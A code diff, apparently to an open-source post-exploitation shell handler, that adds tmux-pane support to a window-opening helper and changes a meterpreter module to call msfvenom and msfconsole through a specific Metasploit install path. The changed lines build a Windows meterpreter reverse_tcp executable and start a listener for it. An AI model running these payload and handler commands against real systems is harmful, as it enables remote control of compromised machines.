@@ -77,49 +77,85 @@ pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{
 normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
 
 def Open(item, terminal=False):
-	if myOS != 'Darwin' and not DISPLAY:
-		logger.error("No available $DISPLAY")
-		return False
-
 	if not terminal:
+		if myOS != 'Darwin' and not DISPLAY:
+			logger.error("No available $DISPLAY")
+			return False
 		program = 'xdg-open' if myOS != 'Darwin' else 'open'
 		args = [item]
+
+		if not shutil.which(program):
+			logger.error(f"Cannot open: '{program}' binary does not exist")
+			return False
+
+		process = subprocess.Popen(
+			(program, *args),
+			stdin=subprocess.DEVNULL,
+			stdout=subprocess.DEVNULL,
+			stderr=subprocess.PIPE
+		)
+		r, _, _ = select([process.stderr], [], [], .01)
+		if process.stderr in r:
+			error = os.read(process.stderr.fileno(), 1024)
+			if error:
+				logger.error(error.decode())
+				return False
+		return True
 	else:
-		if not TERMINAL:
-			logger.error("No available terminal emulator")
-			return False
-
-		if myOS != 'Darwin':
-			program = TERMINAL
-			_switch = '-e'
-			if program in ('gnome-terminal', 'mate-terminal'):
-				_switch = '--'
-			elif program == 'terminator':
-				_switch = '-x'
-			elif program == 'xfce4-terminal':
-				_switch = '--command='
-			args = [_switch, *shlex.split(item)]
+		# Prefer tmux split-pane if we are inside a tmux session
+		if os.environ.get('TMUX'):
+			try:
+				subprocess.Popen(
+					['tmux', 'split-window', '-h', item],
+					stdin=subprocess.DEVNULL,
+					stdout=subprocess.DEVNULL,
+					stderr=subprocess.DEVNULL
+				)
+				return True
+			except Exception as e:
+				logger.error(f"Failed to open tmux pane: {e}")
+				return False
 		else:
-			program = 'osascript'
-			args = ['-e', f'tell app "Terminal" to do script "{item}"']
+			# Fallback: try a terminal emulator
+			if myOS != 'Darwin' and not DISPLAY:
+				logger.error("No available $DISPLAY and not in a tmux session")
+				return False
 
-	if not shutil.which(program):
-		logger.error(f"Cannot open window: '{program}' binary does not exist")
-		return False
+			if not TERMINAL:
+				logger.error("No available terminal emulator (tip: run inside tmux)")
+				return False
 
-	process = subprocess.Popen(
-		(program, *args),
-		stdin=subprocess.DEVNULL,
-		stdout=subprocess.DEVNULL,
-		stderr=subprocess.PIPE
-	)
-	r, _, _ = select([process.stderr], [], [], .01)
-	if process.stderr in r:
-		error = os.read(process.stderr.fileno(), 1024)
-		if error:
-			logger.error(error.decode())
-			return False
-	return True
+			if myOS != 'Darwin':
+				program = TERMINAL
+				_switch = '-e'
+				if program in ('gnome-terminal', 'mate-terminal'):
+					_switch = '--'
+				elif program == 'terminator':
+					_switch = '-x'
+				elif program == 'xfce4-terminal':
+					_switch = '--command='
+				args = [_switch, *shlex.split(item)]
+			else:
+				program = 'osascript'
+				args = ['-e', f'tell app "Terminal" to do script "{item}"']
+
+			if not shutil.which(program):
+				logger.error(f"Cannot open window: '{program}' binary does not exist")
+				return False
+
+			process = subprocess.Popen(
+				(program, *args),
+				stdin=subprocess.DEVNULL,
+				stdout=subprocess.DEVNULL,
+				stderr=subprocess.PIPE
+			)
+			r, _, _ = select([process.stderr], [], [], .01)
+			if process.stderr in r:
+				error = os.read(process.stderr.fileno(), 1024)
+				if error:
+					logger.error(error.decode())
+					return False
+			return True
 
 
 class Interfaces:
@@ -4877,7 +4913,12 @@ class meterpreter(Module):
 			arch = ''
 			if session.arch == "x64-based_PC":
 				arch = 'x64/'
-			payload_creation_cmd = f"msfvenom -p windows/{arch}meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
+			payload_creation_cmd = (
+				f'BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile '
+				f'/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle exec '
+				f'/opt/tools/metasploit-framework/msfvenom '
+				f'-p windows/{arch}meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}'
+			)
 			logger.info("Creating payload...")
 			print(payload_creation_cmd)
 			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
@@ -4888,7 +4929,10 @@ class meterpreter(Module):
 				os.remove(payload_path)
 				if uploaded_path:
 					meterpreter_handler_cmd = (
-						'msfconsole -x "use exploit/multi/handler; '
+						'BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile '
+						'/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle exec '
+						'/opt/tools/metasploit-framework/msfconsole '
+						'-x "use exploit/multi/handler; '
 						f'set payload windows/{arch}meterpreter/reverse_tcp; '
 						f'set LHOST {host}; set LPORT {port}; run"'
 					)
